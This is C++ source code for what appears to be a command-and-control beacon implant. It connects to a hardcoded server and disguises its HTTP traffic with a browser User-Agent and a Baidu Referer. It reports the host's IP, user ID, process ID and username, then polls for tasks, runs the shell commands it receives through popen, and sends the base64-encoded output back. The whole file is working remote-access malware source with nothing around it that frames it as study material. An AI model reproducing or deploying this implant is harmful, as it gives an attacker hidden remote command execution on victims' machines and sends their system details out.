
#include "include/b64.h"
#include "include/Beacon.h"

int g_time_alive = HEARTBEAT_TIME;
beacon g_current_beacon;
std::string g_online_uri = "/online/";
std::string g_task_uri = "/c2/";


std::vector<std::string> g_headers = {
    "Host: 127.0.0.1:5000\r\n",
    "Connection: keep-alive\r\n",
    "Accept: */*\r\n",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\r\n",
    "Referer: https://baidu.com/s?ie=utf-8&wd=\r\n",
    "\r\n",
};


std::string task_exec_command(std::string data){
    FILE * fp;
    char * ret = NULL;
    char * buffer = NULL;
    std::string result;
    fp=popen(data.data(), "r");
    do{
        buffer = (char *)calloc(80,sizeof(char));
        ret = fgets(buffer,sizeof(buffer),fp);
        result.append(buffer);
        free(buffer);
    }while(ret != NULL);
    pclose(fp);
    return result;
}


/**
 * 
 * 
 * Handle task
 * 
 * 
 */

std::string handle_task(Task_PACK task , std::string task_data){
    std::string task_result;
    switch (task.task_type)
    {
    case EXEC_COMMAND:
        /* code */
        task_result = task_exec_command(task_data);
        std::cout << task_result << std::endl;
        break;
    default:
        break;
    }
    return task_result;
}

std::string find_value_by_key(std::string data, std::string key){
	size_t pos = 0, temp_pos = 0;
	std::string result;
	do{
		std::string temp_str;
		pos = data.find("&",pos); // find & split str
		if(pos == std::string::npos){
			temp_str = data.substr(temp_pos);
		}else{
			temp_str = data.substr(temp_pos, pos - temp_pos);
			pos++;
			temp_pos = pos;
		}
		size_t k_pos = temp_str.find("=");
		if(k_pos == std::string::npos){
			result = temp_str;
			break;
		}else{
			std::string keyname = temp_str.substr(0, k_pos);
			if(keyname == key){
				result = temp_str.substr(k_pos+1);
				return result;
			}
		}
	}while(pos != std::string::npos);
	return result;
}


/**
 * 
 * get task data and task type by http response
 * 
 */
Task_PACK get_task(std::string response, std::string & task_data){
    int task_int;
    Task_PACK task_pack;
    task_pack.task_type  = NO_TASK;
    std::string task_type_str;
    task_type_str = find_value_by_key(response, "type"); // find task_type
    if(task_type_str.empty()){
        return task_pack;
    }
    task_int = std::stoi(task_type_str);
    // set task type by response
    switch (task_int)
    {
        case 1:
            task_pack.task_type = EXEC_COMMAND;
            std::cout << "[TASK TYPE]: EXEC_COMMAND" << std::endl;
            break;
        case 2:
            task_pack.task_type = SET_TIMEOUT;
            std::cout << "[TASK TYPE]: SET_TIMEOUT" << std::endl;
        default:
            task_pack.task_type = NO_TASK;
            std::cout << "[TASK TYPE]: NO_TASK" << std::endl;
            return task_pack;
    }
    // find task data
    task_data = find_value_by_key(response, "data");
    if(task_data.empty()){
        task_pack.task_type = NO_TASK;
        return task_pack;
    }
    std::cout << "[TASK DATA]: "<< task_data << std::endl;
    task_pack.task_id = find_value_by_key(response, "task_id");
    std::cout << "[TASK ID]: "<< task_pack.task_id << std::endl;
    return task_pack;
}

// 获取第一个IP
unsigned int get_local_ip() {
    std::vector<unsigned int> iplist;
    unsigned int addr = 0;
    struct ifaddrs *ifAddrStruct, * ifaddrs;
    getifaddrs(&ifAddrStruct);
    ifaddrs = ifAddrStruct;
    while(ifaddrs->ifa_next != NULL){
        if(ifaddrs->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *s = (struct sockaddr_in *) ifaddrs->ifa_addr;
            addr = ntohl(s->sin_addr.s_addr);
        }
        ifaddrs = ifaddrs->ifa_next;
    }
    freeifaddrs(ifAddrStruct);
    return addr;
}

int check_socket_alive(int sock){
    fd_set rd;
	struct timeval tv;
	int err;
	FD_ZERO(&rd);
	FD_SET(sock,&rd);
	tv.tv_sec = CHECK_ALIVE_TIMEOUT;
	tv.tv_usec = 0;
    err = select(sock+1,&rd,&rd,NULL,&tv);
    if(err == 0) //超时
	{
		return err;
	}
	else if(err == -1)  //失败
	{
		return err;
	}
	else  //成功
	{
		return 1;
	}
}

int send_task_result(int sock, std::string task_id ,std::string task_result){
    std::vector<std::string> temp_headers = g_headers;
    send_post_msg(sock, g_task_uri.c_str());
    std::string result = "task_id=" + task_id + "&task_data=" + task_result;
    std::string content_length_str = "Content-Length: " + std::to_string(result.length()) + "\r\n";
    temp_headers.insert(temp_headers.end()-1, content_length_str);
    temp_headers.insert(temp_headers.end()-1, "Content-Type: application/x-www-form-urlencoded\r\n");
    temp_headers.insert(temp_headers.end(), result);
    send_header_msg(sock, temp_headers);
    return 0;
}

/*
 * send_beacon_info
 */
int send_beacon_info(int sock){

    BEACON_META_DATA * beacon_meta_data = new BEACON_META_DATA();
    int ret = 0;
    std::string newuri = g_online_uri;
    struct passwd *user;
    char * meta_data_str = NULL;

    // *******************************************
    beacon_meta_data->ip = get_local_ip();
    beacon_meta_data->uid = getuid();
    beacon_meta_data->pid = getpid();
    user = getpwuid(beacon_meta_data->uid);
    // *******************************************

    int u_len = strlen(user->pw_name);
    if(u_len > USERNAME_LEN){
        // 防止缓冲区溢出
        u_len = USERNAME_LEN -1;
    }
    strncpy(beacon_meta_data->username, user->pw_name, u_len);
    meta_data_str = b64_encode((unsigned char *)beacon_meta_data, sizeof(BEACON_META_DATA));
    newuri.append("?data=");
    newuri.append(meta_data_str);
    std::cout << "[+]URI : " << newuri << std::endl;
    ret = send_get_msg(sock, newuri.data());
    send_header_msg(sock, g_headers);
    free(meta_data_str);
    meta_data_str = NULL;
    return ret;
}


int recv_response(int sock, std::string & response){
    std::string response_data;
    fd_set readfd;
    struct timeval timeout;
    timeout.tv_sec=1;
    timeout.tv_usec=0;
    int ret = 0;
    while(true){
        FD_ZERO(&readfd);
        FD_SET(sock,&readfd);
        ret = select(sock+1,&readfd,NULL,NULL,&timeout);
        if(ret == -1){
            break;
        }else if(ret == 0){
            break;
        }else if(FD_ISSET(sock,&readfd)){
            char * buffer = new char[RESPONSE_MAX_BUFFER];
            memset(buffer, 0 , RESPONSE_MAX_BUFFER);
            ret = recv(sock, buffer, RESPONSE_MAX_BUFFER, 0);
            response.append(buffer);
            delete buffer;
        }
    }
    
    std::size_t pos = response.find("\r\n\r\n");
    
    if(pos == std::string::npos){
        return -1;
    }
    response_data = response.substr(pos+4);
    response = response_data;
    return response.length();
}

int send_post_msg(int sock,const char * uri){
    std::string data("POST ");
    data.append(uri);
    data.append(" HTTP/1.1\r\n");
    return send(sock, data.c_str(), data.length(), 0);
}

int send_get_msg(int sock,const char * uri){
    std::string data("GET ");
    data.append(uri);
    data.append(" HTTP/1.1\r\n");
    return send(sock, data.c_str(), data.length(), 0);
}

int send_header_msg(int sock, std::vector<std::string> headers){
    for (auto i = headers.begin(); i < headers.end(); ++i)
    {
        send(sock, i->c_str(), i->length(), 0);
    }
    return 0;
}

int connect_socket(const char * host, unsigned int port){
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sockaddr_info;
    sockaddr_info.sin_addr.s_addr = inet_addr(host);
    sockaddr_info.sin_family = AF_INET;
    sockaddr_info.sin_port = htons(port);
    if(connect(sock, (struct sockaddr *)&sockaddr_info, sizeof(sockaddr_info)) == 0){
        return sock;
    }
    return -1;
}



int main(){
    std::string response;
    int sock = connect_socket("127.0.0.1",5000);
    if(sock < 0){
        std::cout << strerror(errno) << std::endl;
        return -1;
    }
    
    while(check_socket_alive(sock) > 0){
        sleep(g_time_alive);
        std::string task_data;
        std::cout << "[*]HeartBeat " << g_time_alive << std::endl;
        send_beacon_info(sock);
        int response_data_len = recv_response(sock,response);
        if(response_data_len <= 0 ){
            response.clear();
            continue;
        }
        Task_PACK task = get_task(response, task_data);
        if(task.task_type == NO_TASK){
            response.clear();
            continue;
        }
        task_data = handle_task(task, task_data);
        char * encode_data = b64_encode((unsigned char *)task_data.c_str(),task_data.length());
        std::string encode_string = encode_data;
        free(encode_data);
        encode_data = NULL;
        std::cout <<"[+]Send Data : " << task_data.substr(0,30) <<".... " << " Task ID : " << task.task_id << std::endl;
        send_task_result(sock, task.task_id, encode_string);
        response.clear();
    }
    shutdown(sock,SHUT_RDWR);
    return 0;
}

/*
int xmain(){

    int sock = 0;
    sock = connect_socket("127.0.0.1",5000);
    std::string response("type=1&data=ifconfig&task_id=11-22-33-44");
    send_task_result(sock,"ssss","wwww");
    recv_response(sock , response);
    shutdown(sock,SHUT_RDWR);
    return 1;
}
*/

int txmain(){

    /*
    struct beacon_meta_data * beaconMetaData = new beacon_meta_data();
    memset(beaconMetaData, 0 , sizeof(beaconMetaData));
    strncpy(beaconMetaData->username,"12113",5);

    std::cout << "size of :" << sizeof(beacon_meta_data) << std::endl;
    std::cout << b64_encode((unsigned char *)beaconMetaData, sizeof(beacon_meta_data)) << std::endl;
    */
    send_beacon_info(1);

    // send_beacon_info(1);
  return 0;
}